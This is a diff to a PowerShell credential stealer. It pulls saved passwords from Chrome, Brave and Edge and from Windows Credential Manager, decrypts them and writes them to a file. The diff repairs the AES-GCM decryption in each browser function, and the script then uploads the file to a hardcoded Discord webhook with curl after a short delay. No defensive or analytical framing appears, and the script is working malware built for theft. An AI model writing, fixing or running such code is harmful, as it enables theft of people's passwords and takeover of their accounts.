@@ -38,7 +38,9 @@ function Get-ChromePasswords {
             $iv = $encryptedPassword[3..14]
             $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
             $cipher = [System.Security.Cryptography.AesGcm]::new($key)
-            $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
+            $passwordBytes = New-Object byte[] $payload.Length
+            $cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $passwordBytes)
+            $password = [System.Text.Encoding]::UTF8.GetString($passwordBytes)
             $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
         }
         $dbConnection.Close()
@@ -108,7 +110,9 @@ function Get-BravePasswords {
             $iv = $encryptedPassword[3..14]
             $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
             $cipher = [System.Security.Cryptography.AesGcm]::new($key)
-            $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
+            $passwordBytes = New-Object byte[] $payload.Length
+            $cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $passwordBytes)
+            $password = [System.Text.Encoding]::UTF8.GetString($passwordBytes)
             $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
         }
         $dbConnection.Close()
@@ -221,7 +225,9 @@ function Get-EdgePasswords {
             $iv = $encryptedPassword[3..14]
             $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
             $cipher = [System.Security.Cryptography.AesGcm]::new($key)
-            $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
+            $passwordBytes = New-Object byte[] $payload.Length
+            $cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $passwordBytes)
+            $password = [System.Text.Encoding]::UTF8.GetString($passwordBytes)
             $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
         }
         $dbConnection.Close()
@@ -338,8 +344,8 @@ if ($credentialManagerPasswords.Count -gt 0) {
     Add-Content -Path $outputPath -Value "No Credential Manager passwords found."
 }
 
-# Remove-Item -Path $outputPath
 Start-Sleep -Seconds 20 # Add a delay before upload
+
 # Upload to Discord
 $webhookUrl = "https://discordapp.com/api/webhooks/1163648209806180373/1a4UKrWxReg-ICzIMM-Q3Pt14l02wOnM3MUdb4LU6RHs_DlGiFjzq_K0jpFB_yFUDP2R"
 $curlCmd = "curl.exe -F `file1=@$outputPath` $webhookUrl"
